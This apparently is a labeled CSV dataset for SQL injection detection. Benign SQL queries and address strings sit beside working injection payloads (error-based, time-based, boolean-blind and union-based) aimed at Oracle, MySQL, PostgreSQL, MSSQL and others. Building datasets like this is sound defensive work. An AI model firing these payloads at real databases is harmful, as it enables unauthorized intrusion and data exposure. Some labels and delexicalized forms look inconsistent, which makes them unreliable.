payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-9987 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) )",error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" or username = ""1\' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True,original,gold
"1%"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""%"" = """,__INT__ % __STR__ % __STR__,time_blind,postgresql,0.9,True,original,silver
1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( __STR__ | | ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) | | __STR__ ) - -,boolean_blind,firebird,0.7,True,original,bronze
SELECT * FROM sent 3,select * from __IDENT__ __INT__,benign,generic,1.0,False,original,gold
"1"" and ( 1668 = 8054 ) *8054",__INT__ and ( __INT__ = __INT__ ) * __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT * FROM tide WHERE pie IN ( 'particles', 'count', 'knife' )","select * from __IDENT__ where __IDENT__ in ( __STR__ , __STR__ , __STR__ )",benign,mysql,0.9,False,original,silver
"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'isyg' = 'isyg",__INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,sqlite,0.7,True,original,bronze
"1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """,__INT__ % __STR__ % __STR__,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 or username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'enfe\' like \'enfe""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,oracle,0.8,True,original,silver
SELECT * FROM dog,select * from __IDENT__,benign,generic,1.0,False,original,gold
select ( case when ( 4996 = 1734 ) then 1 else 4996* ( select 4996 from master..sysdatabases ) end ) --,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) - -,boolean_blind,mssql,0.7,True,original,bronze
"c/ poeta bernardo de la torre 10,","__IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ ,",benign,generic,0.9,False,original,silver
SELECT * FROM shut WHERE five = 'combine' OR wore = 'put',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
SELECT AVG ( similar ) FROM cutting,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
taburete,__IDENT__,benign,generic,0.9,False,original,silver
SELECT TOP 3 * FROM herd,select top __INT__ * from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT boy, sky+ ', ' + send+ ' ' + label+ ', ' + speed AS image FROM birthday","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
1 ) where 2734 = 2734 waitfor delay '0:0:5'--,__INT__ ) where __INT__ = __INT__ waitfor delay __STR__ - -,time_blind,mssql,0.9,True,original,silver
"calle sant pau, 117,","__IDENT__ __IDENT__ __IDENT__ , __INT__ ,",benign,generic,0.9,False,original,silver
SELECT * FROM customs WHERE beat BETWEEN '1996-07-01' AND '1996-07-31',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) or __IDENT__ = __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
DELETE FROM win,delete from __IDENT__,benign,generic,1.0,False,original,gold
92793320g,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-7199\' or username = ""1%\' and \'%\' = \'"" or username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
"SELECT * FROM users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" AND username = ""1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,boolean_blind,oracle,0.9,True,original,silver
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )","__INT__ and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",time_blind,postgresql,0.7,True,original,bronze
5.79858E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\' )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ )",error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-1254"" "" and username = ""-6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-4952\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ __STR__ - __INT__ __STR__ ) ) ),error_based,oracle,0.95,True,original,gold
1' ) ) as cpwx where 5378 = 5378 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) #,time_blind,mysql,0.7,True,original,bronze
SELECT * FROM tone WHERE swimming = 'rapidly' AND City = 'huge',select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,mysql,0.9,False,original,silver
SELECT * FROM mark WHERE pony = 'led' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False,original,gold
"1%' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ % ' ) or char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True,original,bronze
SELECT forest ( s ) FROM struggle FULL OUTER JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ full outer join,benign,generic,1.0,False,original,gold
"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )","__INT__ ) and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",time_blind,postgresql,0.7,True,original,bronze
"-3913"" where 6085 = 6085 union all select 6085,6085,6085,6085,6085,6085,6085#","- __INT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
"SELECT Employees.sugar, COUNT ( Orders.secretID ) AS situationFROM ( OrdersINNER JOIN thrown ON Orders.morningID = Employees.butID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False,original,gold
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ),select avg ( __IDENT__ ) from drop select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
"carretera de vista-rica s/n,","__IDENT__ __IDENT__ __IDENT__ - __IDENT__ __IDENT__ / __IDENT__ ,",benign,generic,0.9,False,original,silver
"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , md5 ( __HEX__ ) ) #",time_blind,mysql,0.9,True,original,silver
"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" or username = ""-4248 where 3288 = 3288 or username = ""-3880 )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ),auth_bypass,generic,0.5,True,original,bronze
SELECT * FROM cost WHERE sunlight = 'bread' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
gueldos donohue,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,mysql,0.9,False,original,silver
"SELECT Employees.shine, COUNT ( Orders.scaleID ) AS bringFROM ( OrdersINNER JOIN chair ON Orders.begunID = Employees.personID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False,original,gold
"1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","__INT__ or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,mysql,0.85,True,original,silver
SELECT * FROM thrown WHERE judge = 'oil' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,mysql,0.9,False,original,silver
SELECT ring FROM adult,select __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-5863"" and username = ""1"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,0.85,True,original,silver
SELECT column_names FROM table_name WHERE column_name IS NOT NULL;,select __IDENT__ from __IDENT__ where __IDENT__ is not null ;,benign,mysql,0.9,False,original,silver
SELECT REVERSE ( CustomerName ) FROM Customers;,select reverse ( __IDENT__ ) from __IDENT__ ;,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-4248 where 3288 = 3288",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ where __INT__ = __INT__,error_based,postgresql,0.9,True,original,silver
"1%' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( '%' = '",__INT__ % __STR__ % __STR__,boolean_blind,mysql,0.7,True,original,bronze
monturi,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM ( SELECT meal FROM sat ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
"-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--","- __INT__ ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.85,True,original,silver
tamer,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM tax WHERE NOT move = 'probably' AND NOT neck = 'strange',select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"SELECT Employees.brass, COUNT ( Orders.importantID ) AS powderFROM ( OrdersINNER JOIN lonely ON Orders.wayID = Employees.definitionID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False,original,gold
"( select ( case when ( 1938 = 1938 ) then dbms_pipe.receive_message ( chr ( 118 ) ||chr ( 118 ) ||chr ( 112 ) ||chr ( 76 ) ,5 ) else 1938 end ) from dual )","( select ( case when ( __INT__ = __INT__ ) then __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) else __INT__ end ) from dual )",time_blind,oracle,0.9,True,original,silver
1 ) order by 1#,__INT__ ) order by __INT__,benign,generic,1.0,False,original,gold
"-2321%"" ) or 2271 = 7683--","- __INT__ % "" ) or __INT__ = __INT__ - -",boolean_blind,generic,0.5,True,original,bronze
SELECT * FROM station WHERE invented = 'worry' AND City = 'meant',select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf"" or username = ""-7323%"" and username = ""-9987 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) )",boolean_blind,generic,0.85,True,original,silver
1 ) ) as ehlg where 6340 = 6340,__INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.8,True,original,silver
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 262312 ) ORDER BY meta_id ASC","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ in ( __INT__ ) order by __IDENT__ asc",benign,mysql,0.9,False,original,silver
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw","select __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) from dual and __STR__ = __IDENT__",time_blind,oracle,0.9,True,original,silver
-6377' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'qcms' like 'qcms,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,out_of_band,oracle,0.9,True,original,silver
cufre sans,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-7951\' ) ) ) or username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
SELECT * FROM heard,select * from __IDENT__,benign,generic,1.0,False,original,gold
"SELECT facing, mile, shells FROM equal WHERE dirty IS NULL","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ is null",benign,mysql,0.9,False,original,silver
SELECT DISTINCT circle FROM activity,select distinct __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
"andia, 113 11g","__IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__ and ( ( ( \ __STR__ = \ __STR__ + ( select \ __STR__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) ) + __IDENT__,error_based,oracle,0.95,True,original,gold
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""eqmy"" = ""eqmy","select benchmark ( __INT__ , md5 ( __HEX__ ) ) and ( ( ( __STR__ = __IDENT__",time_blind,mysql,0.9,True,original,silver
"select * from users WHERE username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) where 3381 = 3381",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) where __INT__ = __INT__,error_based,oracle,0.9,True,original,silver
